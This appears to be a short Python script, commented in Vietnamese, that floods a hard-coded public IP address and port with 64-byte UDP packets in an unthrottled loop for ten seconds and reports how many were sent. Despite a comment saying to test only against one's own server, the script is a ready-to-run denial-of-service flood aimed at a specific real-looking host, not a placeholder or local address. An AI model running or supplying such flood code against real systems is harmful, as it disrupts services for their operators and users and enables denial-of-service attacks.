import socket
import time

# Cấu hình mục tiêu
# LƯU Ý: Chỉ nên test với IP server của chính bạn sở hữu
target_ip = "185.207.166.13" 
target_port = 12006
duration = 10 # Thời gian chạy (giây)

# Tạo một gói tin mẫu (64 bytes)
data = b"X" * 64 

# Khởi tạo Socket UDP (SOCK_DGRAM)
client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

print(f"[!] Bắt đầu gửi dữ liệu tới {target_ip}:{target_port} trong {duration}s...")

timeout = time.time() + duration
sent_packets = 0

try:
    while time.time() < timeout:
        client.sendto(data, (target_ip, target_port))
        sent_packets += 1
        # Nếu muốn gửi chậm lại để theo dõi, hãy bỏ dấu # ở dòng dưới:
        # time.sleep(0.01) 
except KeyboardInterrupt:
    print("\n[!] Đã dừng bởi người dùng.")

print(f"[✓] Hoàn tất! Đã gửi tổng cộng {sent_packets} gói tin.")